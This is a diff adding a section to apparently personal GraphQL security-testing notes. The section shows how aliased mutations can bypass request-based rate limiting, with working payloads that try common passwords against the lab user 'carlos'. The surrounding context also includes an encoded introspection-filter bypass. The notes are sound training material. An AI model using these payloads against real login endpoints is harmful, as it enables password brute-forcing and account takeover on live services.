@@ -184,6 +184,66 @@ Introspection disabled => maybe by using regex to exclude `__schema` keyword in 
 - GET / POST with x-www-form-urlencoded
   - `GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D` 
 
+## 4. Bypass rate limiting using aliases
+
+Some limiters are base on HTTP requests received rather than nb of operations performed.
+Using aliases feature to make multiple queries in a single HTTP message. REturn multiple instances of same type of Object in one request.
+
+```
+# standard query one call of mutation
+{"query":"
+    mutation login($input: LoginInput!) {
+        login(input: $input) {
+           token
+           success        }
+    }","operationName":"login","variables":{
+      "input":{
+        "username":"carlos",
+        "password":"test"
+     }
+   }
+}
+```
+```
+#Request with aliased queries
+{
+        "query":"mutation login($input: LoginInput!) {
+            login(input: $input) {
+                token\n        success
+            }
+            bruteforce0: login(input: { password: \"123456\", username: \"carlos\" }) {
+                token
+                success
+            }
+            bruteforce1: login(input: { password: \"password\", username: \"carlos\" }) {
+                token
+                success
+            }
+        }","variables":{
+          "input":{
+            "username":"carlos",
+            "password":"test"
+           }
+        }
+}
+```
+Switch to GraphQL tab to simplify query data:
+```
+query login($input:String){
+  bruteforce0:login(input:{password: "123456", username: "carlos"}) {
+    token
+    success
+  }
+  bruteforce1:login(input:{password: "password", username: "carlos"}) {
+    token
+    success
+  }
+  bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
+    token
+    success
+  }
+}
+```
 
 
 
